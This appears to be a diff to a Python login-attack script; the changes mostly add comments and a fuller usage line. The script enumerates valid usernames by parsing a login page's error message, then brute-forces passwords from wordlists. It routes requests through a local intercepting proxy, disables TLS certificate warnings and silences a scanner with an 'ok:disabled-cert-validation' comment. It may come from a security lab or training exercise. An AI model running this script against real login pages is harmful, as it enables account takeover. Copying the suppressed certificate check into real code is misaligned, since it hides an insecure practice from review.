@@ -4,7 +4,6 @@ import requests
 import urllib3
 from bs4 import BeautifulSoup
 
-# Step 1: Read in wordlists for username and password
 # Step 2: take in the requested url as an input parameter
 # Step 3: set up data needed for sending POST or get request (starting off with POST)
 # Step 4: User enumeration
@@ -14,6 +13,7 @@ from bs4 import BeautifulSoup
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
+#  Read in wordlists for username and password
 def read_wordfile(wordfile):
     # open passed wordfile file
     file = open(wordfile)
@@ -27,6 +27,7 @@ def read_wordfile(wordfile):
     return wordfile_list
 
 
+# prepare the payloads to be used for POST requests
 def prepare_payload(username, password, setting_password):
     # setting_password should be true if we are setting the password
     # Prepare the payload
@@ -36,8 +37,10 @@ def prepare_payload(username, password, setting_password):
         return {"username": f"{username}", "password": "random"}
 
 
+# perform_request will actually send the request using the payloads
 def perform_request(url, username, password, user_or_pass):
     proxies = {"http": "http://localhost:8080", "https": "http://localhost:8080"}
+    # ok:disabled-cert-validation
     response = requests.post(
         url,
         data=prepare_payload(username, password, user_or_pass),
@@ -54,6 +57,7 @@ def perform_request(url, username, password, user_or_pass):
     return response
 
 
+# enumerate the returned login error by parsing the HTML
 def grab_response_error(response):
     soup = BeautifulSoup(response.content, "html.parser")
     tag = soup.find("p", class_="is-warning")
@@ -62,6 +66,7 @@ def grab_response_error(response):
     return tag
 
 
+# logic for enumerating the correct username
 def enumerate_usernames(url, usernames):
     hits = ""
     for username in usernames:
@@ -77,6 +82,7 @@ def enumerate_usernames(url, usernames):
     return hits
 
 
+# logic for enumerating the passwords
 def brute_password(url, username, passwords):
     for password in passwords:
         cleaned_text = password.replace("\n", "")
@@ -88,7 +94,7 @@ def brute_password(url, username, passwords):
 def main():
     # ensure proper command line variables were passed
     if len(sys.argv) != 4:
-        print("(+) Usage: %s <url>" % sys.argv[0])
+        print("(+) Usage: %s <url> <usernames.txt> <passwords.txt>" % sys.argv[0])
         print(
             "(+) Example: %s www.example.com file/path/usernames file/path/passwords"
             % sys.argv[0]
